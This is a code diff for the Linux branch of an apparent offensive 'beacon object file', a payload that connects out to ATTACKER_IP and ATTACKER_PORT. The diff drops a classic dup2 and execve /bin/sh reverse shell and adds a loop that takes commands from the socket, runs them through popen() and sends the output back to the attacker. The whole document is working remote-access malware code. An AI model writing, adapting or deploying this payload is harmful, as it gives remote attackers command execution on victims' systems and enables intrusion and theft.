@@ -45,13 +45,19 @@
 #elif defined(__linux__) || defined(__unix__)
     #include <arpa/inet.h>
     #include <unistd.h>
+    #include <fcntl.h>
+    #include <errno.h>
+    #include <string>
 
     int payload_init() {
+
         struct sockaddr_in sa;
         sa.sin_family = AF_INET;
         sa.sin_port = htons(ATTACKER_PORT);
         sa.sin_addr.s_addr = inet_addr(ATTACKER_IP);
 
+
+        // Connect to target.
         int sockt = socket(AF_INET, SOCK_STREAM, 0);
 
         if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
@@ -59,14 +65,41 @@
             return (1);
         }
 
-        dup2(sockt, 0);
-        dup2(sockt, 1);
-        dup2(sockt, 2);
+        const char* msg = "WARNING: This is not a normal reverse shell, execution is done by popen()!\n\n";
+        send(sockt, msg, 77, 0);
 
-        char *const argv[] = {"/bin/sh", NULL};
-        execve("/bin/sh", argv, NULL);
+        char buffer[1024];
+        for (;;) {
 
-        return (0);
+            // Receive command.
+            ssize_t bytesRead = recv(sockt, buffer, sizeof(buffer) -1, 0);
+            if (bytesRead <= 0) {
+                break;
+            }
+
+            buffer[bytesRead] = '\0'; // For string termination.
+
+            // Execute command in popen().
+            FILE* commandOutput = popen(buffer, "r");
+            if (commandOutput == nullptr) {
+                printf("Failed to execute command! Error code: %d\n", errno);
+                break;
+            }
+
+            std::string output;
+            char outputBuffer[1024];
+            while (fgets(outputBuffer, 1024, commandOutput) != 0) {
+                output += outputBuffer;
+            }
+
+            pclose(commandOutput); // Cleanup close.
+ 
+            // Send command output to attacker
+            send(sockt, output.c_str(), output.length(), 0);
+        }
+
+        close(sockt);
+        return 0;
     }
 #else
     #error Sorry this operating system is not supported for this beacon object file!
